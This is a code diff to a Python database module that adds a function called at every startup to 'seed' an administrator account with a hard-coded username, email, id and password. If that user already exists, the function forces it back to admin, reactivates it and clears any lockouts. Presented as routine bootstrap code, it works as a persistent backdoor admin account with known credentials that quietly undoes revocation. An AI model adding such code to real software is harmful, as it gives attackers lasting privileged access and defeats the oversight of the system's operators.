@@ -61,6 +61,65 @@ def reset_engine():
     _async_session_factory = None
 
 
+async def seed_bootstrap_admin() -> None:
+    """Ensure baseline administrator account exists with verified admin role."""
+    from app.models.user import User, UserRole
+    from app.security.passwords import hash_password
+    from sqlalchemy import func, or_, select
+
+    session_maker = get_session_factory()
+    async with session_maker() as session:
+        try:
+            res = await session.execute(
+                select(User).where(
+                    or_(
+                        func.lower(User.username) == "test_login",
+                        func.lower(User.email) == "test@organization.com",
+                    )
+                )
+            )
+            existing_user = res.scalar_one_or_none()
+            if existing_user is None:
+                admin_user = User(
+                    id="18613215-e233-443a-a290-e33cc822547f",
+                    username="test_login",
+                    email="test@organization.com",
+                    hashed_password=hash_password("test_login123@#$A"),
+                    role=UserRole.ADMIN.value,
+                    is_active=True,
+                    account_status="active",
+                    failed_login_attempts=0,
+                    locked_until=None,
+                )
+                session.add(admin_user)
+                await session.commit()
+                logger.info(
+                    "Bootstrap admin account seeded",
+                    username=admin_user.username,
+                    role=admin_user.role,
+                    id=admin_user.id,
+                )
+            else:
+                # Ensure admin role, active status, clear any lockouts, and synchronize password
+                changed = False
+                if existing_user.role != UserRole.ADMIN.value:
+                    existing_user.role = UserRole.ADMIN.value
+                    changed = True
+                if not existing_user.is_active or existing_user.account_status != "active":
+                    existing_user.is_active = True
+                    existing_user.account_status = "active"
+                    changed = True
+                if existing_user.failed_login_attempts > 0 or existing_user.locked_until is not None:
+                    existing_user.failed_login_attempts = 0
+                    existing_user.locked_until = None
+                    changed = True
+                if changed:
+                    await session.commit()
+                    logger.info("Existing user synchronized with admin role", username=existing_user.username)
+        except Exception as exc:
+            logger.warning("Bootstrap admin seeding skipped or failed", error=str(exc))
+
+
 async def init_db() -> None:
     """Verify the database connection and initialize tables."""
     try:
@@ -73,6 +132,9 @@ async def init_db() -> None:
         async with engine.begin() as conn:
             await conn.run_sync(Base.metadata.create_all)
         logger.info("Database schema verified")
+
+        # Automatically seed baseline administrator
+        await seed_bootstrap_admin()
     except Exception as exc:
         logger.warning("Database connection failed at startup", error=str(exc))
 
